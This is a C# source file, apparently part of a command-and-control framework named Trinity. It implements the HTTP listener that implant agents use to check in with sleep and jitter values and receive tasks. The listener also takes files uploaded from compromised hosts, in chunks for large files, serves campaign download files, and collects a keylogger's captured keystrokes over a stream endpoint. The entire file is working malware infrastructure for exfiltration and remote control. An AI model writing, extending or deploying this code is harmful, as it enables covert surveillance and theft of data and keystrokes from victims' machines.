//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using Microsoft.Extensions.Logging;
using System.Net;
using System.Text;
using Trinity.Shared.Errors;
using Trinity.Shared.Results;

namespace Trinity.Shared.Modules
{
    public class HttpModule
    {
        /// <summary>Path the agent posts its checkin blob to.</summary>
        public const string CheckinPath = "/api/v1/agents/checkin";

        /// <summary>Prefix the agent uploads files to: /api/files/{agentKey}/{fileName}/file.</summary>
        public const string FilePathPrefix = "/api/files/";

        /// <summary>Prefix the agent appends continuous data to: /api/streams/{agentKey}/{streamId}/data.</summary>
        public const string StreamPathPrefix = "/api/streams/";

        private HttpListener _httpListener { get; set; }
        private CancellationTokenSource _cts;
        private ILogger<HttpModule> _logger;
        private readonly Func<string, int, int, Task<Result<string>>>? _checkinHandler;
        private readonly Func<string, string, Stream, CancellationToken, Task>? _fileUploadHandler;
        private readonly Func<int, string, Stream, CancellationToken, Task<bool>>? _fileDownloadHandler;
        private readonly Func<string, string, int, Stream, CancellationToken, Task>? _chunkUploadHandler;
        private readonly Func<string, string, CancellationToken, Task<string>>? _rebuildHandler;
        private readonly Func<string, string, Stream, CancellationToken, Task>? _streamDataHandler;

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// 
        /// </summary>
        /// <param name="logger"></param>
        /// <param name="httpListener"></param>
        /// <param name="logger"></param>
        /// <param name="httpListener"></param>
        /// <param name="checkinHandler">
        /// Optional handler for POST /api/v1/agents/checkin. The host supplies it so this shared module
        /// can forward agent checkins to the agent service without referencing the TeamServer.
        /// </param>
        /// <param name="fileUploadHandler">
        /// Optional handler for POST /api/files/{agentKey}/{fileName}/file. The host stores the body.
        /// </param>
        /// <param name="fileDownloadHandler">
        /// Optional handler for GET /api/files/{campaignId}/{fileName}. The host streams the file into the
        /// supplied output stream and returns false when it does not exist.
        /// </param>
        /// <param name="chunkUploadHandler">
        /// Optional handler for POST /api/files/{agentKey}/{transferId}/chunks/{n}. The host stores chunk n
        /// of the transfer's upload.
        /// </param>
        /// <param name="rebuildHandler">
        /// Optional handler for POST /api/files/{agentKey}/{transferId}/rebuild. The host joins the stored
        /// chunks in order and returns the rebuilt path.
        /// </param>
        /// <param name="streamDataHandler">
        /// Optional handler for POST /api/streams/{agentKey}/{streamId}/data. The host appends the body to
        /// the stream — the keylogger's harvest uses this.
        /// </param>
        public HttpModule(
            ILogger<HttpModule> logger,
            HttpListener httpListener,
            Func<string, int, int, Task<Result<string>>>? checkinHandler = null,
            Func<string, string, Stream, CancellationToken, Task>? fileUploadHandler = null,
            Func<int, string, Stream, CancellationToken, Task<bool>>? fileDownloadHandler = null,
            Func<string, string, int, Stream, CancellationToken, Task>? chunkUploadHandler = null,
            Func<string, string, CancellationToken, Task<string>>? rebuildHandler = null,
            Func<string, string, Stream, CancellationToken, Task>? streamDataHandler = null
        )
        {
            _httpListener = httpListener;
            _cts = new CancellationTokenSource();
            _logger = logger;
            _checkinHandler = checkinHandler;
            _fileUploadHandler = fileUploadHandler;
            _fileDownloadHandler = fileDownloadHandler;
            _chunkUploadHandler = chunkUploadHandler;
            _rebuildHandler = rebuildHandler;
            _streamDataHandler = streamDataHandler;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Starts an asynchronous loop that accepts incoming HTTP requests and dispatches each request to a background
        /// task for processing until cancellation is requested.
        /// </summary>
        /// <remarks>Requires HttpListener to be started. Each incoming request is handled concurrently
        /// via Task.Run; exceptions thrown by request handlers are not observed here. Use the associated
        /// CancellationTokenSource to stop polling.</remarks>
        /// <returns>A task representing the asynchronous operation; completes when polling stops (for example, when cancellation
        /// is requested).</returns>
        public async Task StartPolling()
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                HttpListenerContext context = await _httpListener.GetContextAsync();
                _ = Task.Run(() => ProcessRequestAsync(context), _cts.Token);
            }
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Processes an incoming HttpListenerContext by sending a fixed UTF-8 HTML acknowledgment, logging receipt and
        /// exceptions, and ensuring the response is closed.
        /// </summary>
        /// <remarks>Writes a UTF-8 encoded HTML acknowledgment to the response stream, sets
        /// ContentLength64, logs informational and error events, and closes the response in a finally block.</remarks>
        /// <param name="context">The HttpListenerContext containing the HTTP request and response.</param>
        /// <summary>
        /// Reads <c>sleep</c> and <c>jitter</c> out of a check-in query string. Missing or malformed
        /// values come back as 0, which the service treats as "not reported".
        /// </summary>
        private static (int SleepMs, int Jitter) ReadInterval(string? query)
        {
            if (string.IsNullOrEmpty(query))
            {
                return (0, 0);
            }

            int sleep = 0;
            int jitter = 0;

            foreach (string pair in query.TrimStart('?').Split('&', StringSplitOptions.RemoveEmptyEntries))
            {
                int separator = pair.IndexOf('=');
                if (separator <= 0)
                {
                    continue;
                }

                string name = pair[..separator];
                string value = pair[(separator + 1)..];

                if (name.Equals("sleep", StringComparison.OrdinalIgnoreCase))
                {
                    int.TryParse(value, out sleep);
                }
                else if (name.Equals("jitter", StringComparison.OrdinalIgnoreCase))
                {
                    int.TryParse(value, out jitter);
                }
            }

            return (sleep, jitter);
        }

        private async Task ProcessRequestAsync(HttpListenerContext context)
        {
            try
            {
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;

                _logger.LogDebug(
                    "Request recieved from agent: {Method} {Path}",
                    request.HttpMethod,
                    request.Url?.AbsolutePath
                );

                // Agent checkin: payload UUID prefix + JSON body -> task/response blob (already base64).
                if (
                    _checkinHandler is not null
                    && request.HttpMethod == "POST"
                    && request.Url?.AbsolutePath.Equals(CheckinPath, StringComparison.OrdinalIgnoreCase) == true
                )
                {
                    string blob;
                    using (var reader = new StreamReader(request.InputStream, request.ContentEncoding ?? Encoding.UTF8))
                    {
                        blob = await reader.ReadToEndAsync();
                    }

                    // The interval the agent is running at rides along as ?sleep=&jitter=; it has to
                    // be read here because agent traffic never reaches the MVC controller — this
                    // listener is the only entry point it uses.
                    (int sleepMs, int jitter) = ReadInterval(request.Url?.Query);
                    Result<string> result = await _checkinHandler(blob, sleepMs, jitter);
                    _logger.LogDebug(
                        "Checkin handled: success={Success} length={Length}",
                        result.IsSuccess,
                        result.Response?.Length ?? -1
                    );

                    WriteBody(
                        response,
                        result.IsSuccess ? 200 : 400,
                        result.IsSuccess ? result.Response ?? string.Empty : string.Empty,
                        "text/plain"
                    );
                    return;
                }

                // File transfer travels over the listener port too, so route it here instead of
                // falling through to the acknowledgement page.
                if (await TryHandleFileTransferAsync(context, request, response))
                {
                    return;
                }

                // Continuous streams (the keylogger's harvest) come over the same port.
                if (await TryHandleStreamAsync(context, request, response))
                {
                    return;
                }

                WriteBody(response, 200, "<HTML><BODY> Recieved </BODY></HTML>", "text/html");
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Exception occured: {Message}", ex.Message);
            }
            finally
            {
                context.Response.Close();
            }
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Routes the agent's file transfer endpoints when the host supplied handlers.
        /// </summary>
        /// <remarks>
        /// Upload:   POST /api/files/{agentKey}/{fileName}/file  (raw body)
        /// Chunks:   POST /api/files/{agentKey}/{transferId}/chunks/{n}  (raw body)
        /// Rebuild:  POST /api/files/{agentKey}/{transferId}/rebuild
        /// Download: GET  /api/files/{campaignId}/{fileName}
        /// </remarks>
        /// <returns>True when the request was handled, false to let the caller fall through.</returns>
        private async Task<bool> TryHandleFileTransferAsync(
            HttpListenerContext context,
            HttpListenerRequest request,
            HttpListenerResponse response
        )
        {
            string? path = request.Url?.AbsolutePath;
            if (path is null || !path.StartsWith(FilePathPrefix, StringComparison.OrdinalIgnoreCase))
            {
                return false;
            }

            string[] segments = path.Substring(FilePathPrefix.Length).Split('/', StringSplitOptions.RemoveEmptyEntries);

            // POST /api/files/{agentKey}/{transferId}/chunks/{n} — a chunk of a large upload. The agent
            // streams files at or above 100 MB this way (reference: FileTransfer::SendFile on test).
            if (
                _chunkUploadHandler is not null
                && request.HttpMethod == "POST"
                && segments.Length == 4
                && segments[2].Equals("chunks", StringComparison.OrdinalIgnoreCase)
                && int.TryParse(segments[3], out int chunkNumber)
            )
            {
                string agentKey = Uri.UnescapeDataString(segments[0]);
                string transferId = Uri.UnescapeDataString(segments[1]);

                try
                {
                    await _chunkUploadHandler(agentKey, transferId, chunkNumber, request.InputStream, _cts.Token);
                }
                catch (Exception ex)
                {
                    // Same rule as the single-file upload: a 200 for a chunk that was not stored makes
                    // the agent report a successful transfer that never happened.
                    _logger.LogError(ex, "Chunk upload failed: {TransferId} chunk {ChunkNumber}", transferId, chunkNumber);
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    response.ContentLength64 = 0;
                    return true;
                }

                _logger.LogDebug("Chunk stored: {TransferId} #{ChunkNumber}", transferId, chunkNumber);
                WriteBody(
                    response,
                    200,
                    $"{{\"message\":\"Chunk received.\",\"transferId\":\"{transferId}\",\"chunkNumber\":{chunkNumber}}}",
                    "application/json"
                );
                return true;
            }

            // POST /api/files/{agentKey}/{transferId}/rebuild — the sender signals completion.
            if (
                _rebuildHandler is not null
                && request.HttpMethod == "POST"
                && segments.Length == 3
                && segments[2].Equals("rebuild", StringComparison.OrdinalIgnoreCase)
            )
            {
                string agentKey = Uri.UnescapeDataString(segments[0]);
                string transferId = Uri.UnescapeDataString(segments[1]);

                string rebuiltPath;
                try
                {
                    rebuiltPath = await _rebuildHandler(agentKey, transferId, _cts.Token);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Chunk rebuild failed: {TransferId}", transferId);
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    response.ContentLength64 = 0;
                    return true;
                }

                _logger.LogDebug("Transfer rebuilt: {TransferId} -> {Path}", transferId, rebuiltPath);
                WriteBody(response, 200, $"{{\"message\":\"File rebuilt.\",\"transferId\":\"{transferId}\"}}", "application/json");
                return true;
            }

            // POST /api/files/{agentKey}/{fileName}/file
            if (
                _fileUploadHandler is not null
                && request.HttpMethod == "POST"
                && segments.Length == 3
                && segments[2].Equals("file", StringComparison.OrdinalIgnoreCase)
            )
            {
                string agentKey = Uri.UnescapeDataString(segments[0]);
                string fileName = Uri.UnescapeDataString(segments[1]);

                try
                {
                    await _fileUploadHandler(agentKey, fileName, request.InputStream, _cts.Token);
                }
                catch (Exception ex)
                {
                    // Surface the failure: returning 200 here makes the agent report a
                    // successful upload for a file that was never stored.
                    _logger.LogError(ex, "File upload failed: {FileName}", fileName);
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    response.ContentLength64 = 0;
                    return true;
                }

                _logger.LogDebug("File upload stored: {FileName}", fileName);

                WriteBody(response, 200, $"{{\"message\":\"File received.\",\"fileName\":\"{fileName}\"}}", "application/json");
                return true;
            }

            // GET /api/files/{campaignId}/{fileName}
            if (
                _fileDownloadHandler is not null
                && request.HttpMethod == "GET"
                && segments.Length == 2
                && int.TryParse(segments[0], out int campaignId)
            )
            {
                string fileName = Uri.UnescapeDataString(segments[1]);
                bool found;
                try
                {
                    found = await _fileDownloadHandler(campaignId, fileName, response.OutputStream, _cts.Token);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "File download failed: {FileName}", fileName);
                    response.StatusCode = (int)HttpStatusCode.InternalServerError;
                    response.ContentLength64 = 0;
                    return true;
                }

                if (!found)
                {
                    response.StatusCode = (int)HttpStatusCode.NotFound;
                    response.ContentLength64 = 0;
                    return true;
                }

                _logger.LogDebug("File download served: {FileName}", fileName);
                return true;
            }

            return false;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Routes the agent's stream endpoint: <c>POST /api/streams/{agentKey}/{streamId}/data</c>.
        /// </summary>
        /// <remarks>
        /// The keylogger harvests its capture through this route; the reference's
        /// <c>FileTransfer::SendStreamData</c> posted here. Each request appends to the stream.
        /// </remarks>
        /// <returns>True when the request was handled, false to let the caller fall through.</returns>
        private async Task<bool> TryHandleStreamAsync(
            HttpListenerContext context,
            HttpListenerRequest request,
            HttpListenerResponse response
        )
        {
            string? path = request.Url?.AbsolutePath;
            if (
                _streamDataHandler is null
                || path is null
                || request.HttpMethod != "POST"
                || !path.StartsWith(StreamPathPrefix, StringComparison.OrdinalIgnoreCase)
            )
            {
                return false;
            }

            string[] segments = path.Substring(StreamPathPrefix.Length).Split('/', StringSplitOptions.RemoveEmptyEntries);
            if (segments.Length != 3 || !segments[2].Equals("data", StringComparison.OrdinalIgnoreCase))
            {
                return false;
            }

            string agentKey = Uri.UnescapeDataString(segments[0]);
            string streamId = Uri.UnescapeDataString(segments[1]);

            try
            {
                await _streamDataHandler(agentKey, streamId, request.InputStream, _cts.Token);
            }
            catch (Exception ex)
            {
                // A 200 here would let the agent report a harvest that was never stored.
                _logger.LogError(ex, "Stream data failed: {StreamId}", streamId);
                response.StatusCode = (int)HttpStatusCode.InternalServerError;
                response.ContentLength64 = 0;
                return true;
            }

            _logger.LogDebug("Stream data appended: {StreamId}", streamId);
            WriteBody(response, 200, $"{{\"message\":\"Stream data received.\",\"streamId\":\"{streamId}\"}}", "application/json");
            return true;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Writes <paramref name="body"/> to the response with the supplied status code and content type.
        /// </summary>
        private static void WriteBody(
            HttpListenerResponse response,
            int statusCode,
            string body,
            string contentType
        )
        {
            byte[] buffer = Encoding.UTF8.GetBytes(body);
            response.StatusCode = statusCode;
            response.ContentType = contentType;
            response.ContentLength64 = buffer.Length;
            response.OutputStream.Write(buffer, 0, buffer.Length);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Reconfigure and restart the HTTP listener to bind to the specified port by canceling current operations and
        /// restarting the polling loop.
        /// </summary>
        /// <remarks>Cancels the ongoing polling loop via the internal cancellation token source, clears
        /// and updates HttpListener prefixes, restarts the listener, and starts polling. Logs an error and returns a
        /// specific port-occupied result when binding fails with HttpListenerException.</remarks>
        /// <param name="bindport">Port number to bind the HTTP listener to.</param>
        /// <returns>A Result indicating success, or a port-occupied error if the listener cannot bind to the port.</returns>
        public async Task<Result> Update(int bindport)
        {
            try
            {
                await _cts.CancelAsync();
                _httpListener.Stop();
                _httpListener.Prefixes.Clear();

                _httpListener.Prefixes.Add(CreateURI(bindport));
                await RestartAsync();

                return Result.Success();
            }
            catch (HttpListenerException ex)
            {
                _logger.LogError(ex, "Could not bind HTTP listener to port '{port}'", bindport);
                return ListenerError.PortOccupied(bindport);
            }
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Constructs an HTTP URI for localhost using the specified port.
        /// </summary>
        /// <remarks>Uses System.UriBuilder with scheme "http" and host "localhost".</remarks>
        /// <param name="port">The port number to include in the URI.</param>
        /// <returns>The string representation of the constructed HTTP URI.</returns>
        private string CreateURI(int port)
        {
            var UriBuilder = new UriBuilder("http", "localhost", port);
            return UriBuilder.ToString();
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Restarts the HTTP listener and resumes polling.
        /// </summary>
        /// <remarks>Stops and restarts the HttpListener, then awaits StartPolling. Concurrent invocations
        /// may cause unexpected behavior; callers should avoid invoking Restart concurrently and handle any exceptions
        /// thrown by the listener operations.</remarks>
        /// <returns>A task that represents the asynchronous operation.</returns>
        public async Task RestartAsync()
        {
            _httpListener.Stop();
            _httpListener.Start();
            await _cts.CancelAsync();
            _cts = new CancellationTokenSource();
            _ = Task.Run(async() => StartPolling());
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Stop the HTTP listener and asynchronously cancel ongoing operations.
        /// </summary>
        /// <remarks>HttpListener is stopped synchronously; cancellation of pending work is performed
        /// asynchronously via the cancellation token source. Await the returned task to ensure cancellation handlers
        /// and cleanup have completed; pending requests may be aborted or canceled.</remarks>
        /// <returns>A task that represents the asynchronous shutdown operation.</returns>
        public async Task ShutdownAsync()
        {
            _httpListener.Stop();
            await _cts.CancelAsync();
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//